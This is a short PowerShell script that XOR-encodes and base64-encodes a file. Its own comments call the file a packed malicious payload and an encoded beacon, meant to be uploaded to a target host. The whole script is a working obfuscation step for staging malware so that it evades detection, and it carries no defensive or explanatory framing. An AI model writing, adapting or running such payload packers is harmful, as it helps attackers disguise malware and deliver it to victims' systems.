#Loads file from path
$Input = $args[0]
$Output = $args[1]
$Xor_Val = $args[2]
	if ( $Input -eq $null ){
		Write-Host "Syntax is name.ps1 packed.txt Xor_Val" }
	else {
#$BinaryPath = Read-Host -Prompt 'Encoded beacon name'
#Loads file from path
#Loads file from path
#$Output = Read-Host -Prompt 'Enter output name'
#$Xor_Val = Read-Host -Prompt "Enter XOR value"
$FilePath = Get-Location
$Combined = "$FilePath\$Input"
Write-Host $Combined
$file = [IO.File]::ReadAllBytes($Combined)
#Xor this file with 82 (pick a random number here)
$encodedFile = $file | ForEach-Object { return $_ -bxor $Xor_Val}
#This is the packed malicious payload in string form
$base64Code = [Convert]::ToBase64String($encodedFile)
#Write it out to a file to be uploaded to the host
[IO.File]::WriteAllText("$FilePath\$Output", $base64Code)
		}
